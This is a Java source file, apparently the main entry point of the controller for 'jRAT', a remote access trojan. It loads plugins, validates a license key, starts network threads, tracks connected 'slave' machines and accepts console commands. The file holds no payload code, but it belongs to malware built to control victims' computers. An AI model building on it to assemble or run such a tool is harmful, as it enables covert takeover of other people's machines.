package se.jrat.client;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.text.DateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import javax.swing.JOptionPane;
import javax.swing.UIManager;

import jrat.api.commands.Commands;
import se.jrat.client.addons.PluginLoader;
import se.jrat.client.commands.DefaultCommands;
import se.jrat.client.net.WebRequest;
import se.jrat.client.settings.AbstractStoreable;
import se.jrat.client.settings.Settings;
import se.jrat.client.settings.SettingsColumns;
import se.jrat.client.settings.SettingsTheme;
import se.jrat.client.settings.StatisticsCountry;
import se.jrat.client.threads.RunnableCheckPlugins;
import se.jrat.client.threads.RunnableNetworkCounter;
import se.jrat.client.threads.ThreadCheckVersion;
import se.jrat.client.threads.ThreadPing;
import se.jrat.client.ui.dialogs.DialogEula;
import se.jrat.client.ui.frames.Frame;
import se.jrat.client.utils.TrayIconUtils;
import se.jrat.common.Logger;
import se.jrat.common.Version;

import com.redpois0n.oslib.OperatingSystem;

public class Main {

	public static boolean liteVersion = true;
	public static boolean debug;
	public static boolean hideTitle;

	public static final List<AbstractSlave> connections = new ArrayList<AbstractSlave>();
	public static Frame instance;

	public static void main(String[] args) throws Exception {	
		System.out.println("jRAT " + Version.getVersion() + " " + DateFormat.getDateInstance(DateFormat.SHORT).format(new Date()));
		
		debug = argsContains(args, "-debug");

		Main.debug("Loading libraries...");
		try {
			PluginLoader.loadLibs();
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		try {
			WebRequest.getUrl("%host%", true);
		} catch (Exception e) {
			e.printStackTrace();
		}

		if (argsContains(args, "-genkey")) {
			Logger.log("Generating key");
			File file = Globals.getKeyFile();
			FileOutputStream out = new FileOutputStream(file);
			out.write(UniqueId.generateBinary());
			out.close();
			Logger.log("Wrote key to " + file.getAbsolutePath());
			System.exit(0);
		}

		hideTitle = argsContains(args, "-hidetitle");

		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
			Main.debug("Mac OS X detected, enabling menubar");
			System.setProperty("apple.laf.useScreenMenuBar", "true");
		}
		
		Globals.mkdirs();

		try {
			SettingsTheme.getGlobal().load();
			UIManager.setLookAndFeel(SettingsTheme.getGlobal().getTheme());
		} catch (Exception ex) {
			Main.debug("Could not use LAF " + SettingsTheme.getGlobal().getTheme() + ", setting default system LAF");
			ex.printStackTrace();
			UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
		}
		
		try {
			boolean validated = UniqueId.validate(argsContains(args, "-showhexkey"));

			if (validated) {
				liteVersion = false;
			}
		} catch (Exception ex) {
			ex.printStackTrace();
			
			if (!argsContains(args, "-debug")) {
				JOptionPane.showMessageDialog(null, Constants.NAME + " is limited, no license detected", Constants.NAME, JOptionPane.ERROR_MESSAGE);
			}
		}

		System.setProperty("jrat.dir", System.getProperty("user.dir"));
		System.setProperty("jrat.version", Version.getVersion());

		try {
			PluginLoader.loadPlugins();
		} catch (Exception e) {
			e.printStackTrace();
		}

		StatisticsCountry.getGlobal().load();
		Settings.getGlobal().load();	
		SettingsColumns.getGlobal().load();
		
		instance = new Frame();

		AbstractStoreable.loadAllGlobals();

		boolean showEULA = Settings.getGlobal().getBoolean("showeula");
		if (!showEULA) {
			DialogEula frame = new DialogEula(false);
			frame.setVisible(true);
		}

		Main.debug("Starting threads...");
		new Thread(new RunnableNetworkCounter()).start();
		new ThreadCheckVersion().start();
		new Thread(new RunnableCheckPlugins()).start();
		new ThreadPing().start();

		instance.setVisible(true);

		Main.debug("Loading tray icon...");
		TrayIconUtils.initialize();

		Runtime.getRuntime().addShutdownHook(new Thread(new ShutdownHook()));

		DefaultCommands.addDefault();

		BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
		String s;

		while ((s = reader.readLine()) != null) {
			Commands.execute(s, System.out);
		}
	}

	public static boolean argsContains(String[] args, String s) {
		for (String str : args) {
			if (str.equalsIgnoreCase(s)) {
				return true;
			}
		}

		return false;
	}

	public static String getArg(String[] args, String arg) {
		for (int i = 0; i < args.length; i++) {
			if (args[i].equalsIgnoreCase(arg)) {
				return args[i + 1];
			}
		}

		return null;
	}

	public static String debug(Object s) {
		if (s == null) {
			s = "null";
		}
		
		if (debug) {
			Logger.log(s.toString());
		}
		
		return s.toString();
	}

	public static String formatTitle() {
		if (hideTitle) {
			return Constants.NAME;
		}
		
		String suffix = liteVersion && !debug ? "Limited" : "";

		return Constants.NAME + " [" + connections.size() + "] " + Version.getVersion() + " " + suffix;
	}
	
	public static boolean isFeatureEnabled() {
		return Main.debug || !Main.liteVersion;
	}

}
